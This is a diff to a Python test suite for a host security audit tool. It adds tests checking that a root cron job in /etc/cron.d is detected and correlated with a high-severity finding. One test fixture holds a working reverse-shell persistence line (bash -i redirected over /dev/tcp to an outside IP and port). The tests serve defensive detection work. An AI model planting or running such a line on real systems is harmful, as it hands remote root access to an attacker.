@@ -170,6 +170,32 @@ def test_aslr_raised_or_unchanged_is_quiet(
     assert _by_key(doc, "config:sysctl:kernel.randomize_va_space") is None
 
 
+def _cron(line: str) -> Callable[[Path], None]:
+    def mutate(root: Path) -> None:
+        (root / "etc/cron.d/sysupd").write_text(line + "\n", encoding="utf-8")
+
+    return mutate
+
+
+def test_reverse_shell_cron_job_surfaces_the_audit_finding_through_the_real_collector(
+    audit: Callable[..., dict[str, Any]],
+) -> None:
+    """The inventory rules rate a new cron line medium; the audit's PER-CRON-002 says high."""
+    doc = _detect(audit(), audit(_cron("* * * * * root bash -i >& /dev/tcp/203.0.113.9/9001 0>&1")))
+    job = next(
+        d for d in doc["detections"] if d["subject"]["key"].startswith("cron:/etc/cron.d/sysupd")
+    )
+    fnd = _by_key(doc, "finding:PER-CRON-002")
+    assert job["severity"] == "medium"
+    assert fnd is not None and fnd["severity"] == "high"
+    assert fnd["id"] in {c["id"] for c in job["correlated"]}
+
+
+def test_benign_cron_job_does_not_promote_a_finding(audit: Callable[..., dict[str, Any]]) -> None:
+    doc = _detect(audit(), audit(_cron("0 2 * * * root /usr/local/bin/backup.sh")))
+    assert not [d for d in doc["detections"] if d["subject"]["domain"] == "findings"]
+
+
 # ---------------------------------------- Windows: rule keys exist in the collector sources
 
 
